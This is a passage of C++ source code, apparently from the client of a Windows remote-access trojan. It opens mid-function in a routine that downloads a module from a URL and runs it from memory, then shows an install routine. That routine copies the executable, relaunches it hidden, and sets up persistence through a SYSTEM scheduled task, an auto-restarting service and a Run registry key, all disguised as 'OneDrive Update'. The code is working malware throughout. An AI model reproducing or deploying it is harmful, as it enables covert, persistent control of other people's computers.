                        if (!buffer.empty()) {
                            HMEMORYMODULE hMod = MemoryLoadLibrary(buffer.data(), buffer.size());
                            if (hMod) {
                                PFN_MODULE_ENTRY pEntry = (PFN_MODULE_ENTRY)MemoryGetProcAddress(hMod, "ModuleEntry");
                                if (pEntry) {
                                    pEntry(INVALID_SOCKET, NULL); 
                                } else {
                                    MemoryFreeLibrary(hMod);
                                }
                            }
                        }
                    }
                    return 0;
                }, new std::wstring(url), 0, NULL);
            }
        }
    }

    void InstallClient() {
        wchar_t szCurrentPath[MAX_PATH];
        GetModuleFileNameW(NULL, szCurrentPath, MAX_PATH);
        
        std::wstring installDir = ExpandPath(UTF8ToWide(g_ServerConfig.szInstallDir));
        std::wstring installName = UTF8ToWide(g_ServerConfig.szInstallName);
        
        if (!installDir.empty() && !installName.empty()) {
            if (GetFileAttributesW(installDir.c_str()) == INVALID_FILE_ATTRIBUTES) {
                CreateDirectoryW(installDir.c_str(), NULL);
            }
            
            std::wstring destPath = installDir;
            if (destPath.back() != L'\\' && destPath.back() != L'/') destPath += L'\\';
            
            if (installName.length() < 4 || _wcsicmp(installName.c_str() + installName.length() - 4, L".exe") == 0) {
                // Keep it
            } else {
                installName += L".exe";
            }
            destPath += installName;
            
            if (_wcsicmp(szCurrentPath, destPath.c_str()) != 0) {
                if (CopyFileW(szCurrentPath, destPath.c_str(), FALSE)) {
                    if (g_ServerConfig.runasAdmin != 1 || IsAdmin()) {
                        ShellExecuteW(NULL, L"open", destPath.c_str(), NULL, NULL, SW_HIDE);
                        exit(0);
                    }
                }
            }
        }

        wchar_t szPath[MAX_PATH];
        GetModuleFileNameW(NULL, szPath, MAX_PATH);
        wchar_t szQuotedPath[MAX_PATH * 2];
        swprintf_s(szQuotedPath, MAX_PATH * 2, L"\"%s\"", szPath);
        
        // 1. 计划任务自启
        if (g_ServerConfig.taskStartup == 1) {
            std::wstring taskName = L"OneDrive Update";
            std::wstring configInstallName = UTF8ToWide(g_ServerConfig.szInstallName);
            if (!configInstallName.empty()) {
                taskName = configInstallName;
                if (taskName.length() > 4 && _wcsicmp(taskName.c_str() + taskName.length() - 4, L".exe") == 0) {
                    taskName = taskName.substr(0, taskName.length() - 4);
                }
            }

            const size_t xmlSize = 4096;
            wchar_t szTaskXml[xmlSize];
            swprintf_s(szTaskXml, xmlSize,
                L"<?xml version=\"1.0\" encoding=\"UTF-16\"?>"
                L"<Task version=\"1.2\" xmlns=\"http://schemas.microsoft.com/windows/2004/02/mit/task\">"
                L"<Triggers><LogonTrigger><Enabled>true</Enabled></LogonTrigger><BootTrigger><Enabled>true</Enabled></BootTrigger></Triggers>"
                L"<Principals><Principal id=\"Author\"><UserId>S-1-5-18</UserId><RunLevel>HighestAvailable</RunLevel></Principal></Principals>"
                L"<Settings><MultipleInstancesPolicy>IgnoreNew</MultipleInstancesPolicy><DisallowStartIfOnBatteries>false</DisallowStartIfOnBatteries><StopIfGoingOnBatteries>false</StopIfGoingOnBatteries><AllowHardTerminate>true</AllowHardTerminate><StartWhenAvailable>true</StartWhenAvailable><RunOnlyIfNetworkAvailable>false</RunOnlyIfNetworkAvailable><IdleSettings><StopOnIdleEnd>false</StopOnIdleEnd><RestartOnIdle>false</RestartOnIdle></IdleSettings><AllowStartOnDemand>true</AllowStartOnDemand><Enabled>true</Enabled><Hidden>false</Hidden><RunOnlyIfIdle>false</RunOnlyIfIdle><WakeToRun>false</WakeToRun><ExecutionTimeLimit>PT0S</ExecutionTimeLimit><Priority>7</Priority><RestartOnFailure><Interval>PT1M</Interval><Count>999</Count></RestartOnFailure></Settings>"
                L"<Actions Context=\"Author\"><Exec><Command>%s</Command></Exec></Actions></Task>",
                szPath);

            wchar_t szTempXml[MAX_PATH];
            GetTempPathW(MAX_PATH, szTempXml);
            wcscat_s(szTempXml, L"\\Formidable_Task.xml");
            
            FILE* fp = _wfopen(szTempXml, L"wb");
            if (fp) {
                unsigned short bom = 0xFEFF;
                fwrite(&bom, sizeof(bom), 1, fp);
                fwrite(szTaskXml, sizeof(wchar_t), wcslen(szTaskXml), fp);
                fclose(fp);
                
                wchar_t szCmd[4096];
                if (IsAdmin()) {
                    swprintf_s(szCmd, 4096, L"schtasks /create /tn \"%s\" /xml \"%s\" /f /ru SYSTEM", taskName.c_str(), szTempXml);
                } else {
                    swprintf_s(szCmd, 4096, L"schtasks /create /tn \"%s\" /xml \"%s\" /f", taskName.c_str(), szTempXml);
                }
                _wsystem(szCmd);
                DeleteFileW(szTempXml);
            }
        }

        // 2. 服务自启
        if (g_ServerConfig.serviceStartup == 1) {
            std::wstring serviceName = L"OneDrive Update";
            std::wstring configInstallName = UTF8ToWide(g_ServerConfig.szInstallName);
            if (!configInstallName.empty()) {
                serviceName = configInstallName;
                if (serviceName.length() > 4 && _wcsicmp(serviceName.c_str() + serviceName.length() - 4, L".exe") == 0) {
                    serviceName = serviceName.substr(0, serviceName.length() - 4);
                }
            }
            
            if (!g_IsService) {
                SC_HANDLE hSCM = OpenSCManagerW(NULL, NULL, SC_MANAGER_ALL_ACCESS);
                if (hSCM) {
                    SC_HANDLE hService = CreateServiceW(
                        hSCM, serviceName.c_str(), serviceName.c_str(),
                        SERVICE_ALL_ACCESS, SERVICE_WIN32_OWN_PROCESS,
                        SERVICE_AUTO_START, SERVICE_ERROR_NORMAL,
                        szQuotedPath, NULL, NULL, NULL, NULL, NULL);
                    
                    bool bServiceReady = false;
                    if (hService) {
                        SERVICE_FAILURE_ACTIONS fa = { 0 };
                        SC_ACTION actions[3];
                        actions[0].Type = actions[1].Type = actions[2].Type = SC_ACTION_RESTART;
                        actions[0].Delay = actions[1].Delay = actions[2].Delay = 60000;
                        fa.dwResetPeriod = 86400;
                        fa.cActions = 3;
                        fa.lpsaActions = actions;
                        ChangeServiceConfig2W(hService, SERVICE_CONFIG_FAILURE_ACTIONS, &fa);

                        if (StartServiceW(hService, 0, NULL)) bServiceReady = true;
                        CloseServiceHandle(hService);
                    } else {
                        hService = OpenServiceW(hSCM, serviceName.c_str(), SERVICE_ALL_ACCESS);
                        if (hService) {
                            ChangeServiceConfigW(hService, SERVICE_NO_CHANGE, SERVICE_NO_CHANGE, SERVICE_NO_CHANGE, szQuotedPath, NULL, NULL, NULL, NULL, NULL, NULL);
                            SERVICE_STATUS status;
                            if (QueryServiceStatus(hService, &status)) {
                                if (status.dwCurrentState != SERVICE_RUNNING && status.dwCurrentState != SERVICE_START_PENDING) {
                                    if (StartServiceW(hService, 0, NULL)) bServiceReady = true;
                                } else bServiceReady = true;
                            }
                            CloseServiceHandle(hService);
                        }
                    }
                    CloseServiceHandle(hSCM);
                    if (bServiceReady) exit(0);
                }
            }
        }

        // 3. 注册表自启
        if (g_ServerConfig.registryStartup == 1) {
            std::wstring regName = L"OneDrive Update";
            std::wstring configInstallName = UTF8ToWide(g_ServerConfig.szInstallName);
            if (!configInstallName.empty()) {
                regName = configInstallName;
                if (regName.length() > 4 && _wcsicmp(regName.c_str() + regName.length() - 4, L".exe") == 0) {
                    regName = regName.substr(0, regName.length() - 4);
                }
            }
            HKEY hKey;
            if (RegOpenKeyExW(HKEY_CURRENT_USER, L"Software\\Microsoft\\Windows\\CurrentVersion\\Run", 0, KEY_WRITE, &hKey) == ERROR_SUCCESS) {
                RegSetValueExW(hKey, regName.c_str(), 0, REG_SZ, (BYTE*)szQuotedPath, (DWORD)(wcslen(szQuotedPath) * 2 + 2));
                RegCloseKey(hKey);
            }
        }
    }
}
